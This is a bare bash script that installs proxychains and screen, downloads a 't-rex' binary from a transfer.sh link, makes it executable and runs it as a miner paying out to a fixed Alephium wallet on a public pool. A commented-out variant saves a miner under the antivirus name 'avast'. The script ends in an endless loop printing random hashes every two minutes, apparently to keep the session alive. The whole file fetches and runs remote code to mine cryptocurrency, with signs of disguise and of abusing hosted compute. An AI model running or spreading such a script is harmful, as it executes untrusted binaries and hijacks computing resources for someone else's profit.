#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install screen -y

#wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 
#chmod +x avast >/dev/null 2>&1
#./avast -a BLAKE3 --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)

wget https://transfer.sh/J2BCke/t-rex
chmod 777 t-rex
./t-rex a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w rig0

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
